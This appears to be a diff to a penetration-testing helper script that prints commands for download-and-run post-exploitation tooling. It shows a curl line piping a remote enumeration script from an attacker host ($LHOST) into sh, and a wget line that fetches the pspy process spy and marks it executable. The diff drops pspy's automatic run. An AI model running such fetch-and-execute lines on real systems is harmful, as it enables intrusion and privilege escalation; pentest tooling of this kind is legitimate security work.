@@ -83,6 +83,6 @@ echo "# Linux Smart Enumeration"
 echo "curl -L http://$LHOST:$TOOLS_PORT/linux/linux-smart-enumeration/lse.sh | sh | tee lsenumeration.txt"
 echo
 echo "# Pspy"
-echo "wget -O /tmp/pspy64 http://$LHOST:$TOOLS_PORT/linux/pspy64 && chmod +x /tmp/pspy64  && /tmp/pspy64"
+echo "wget -O /tmp/pspy64 http://$LHOST:$TOOLS_PORT/linux/pspy64 && chmod +x /tmp/pspy64"
 echo
 echo
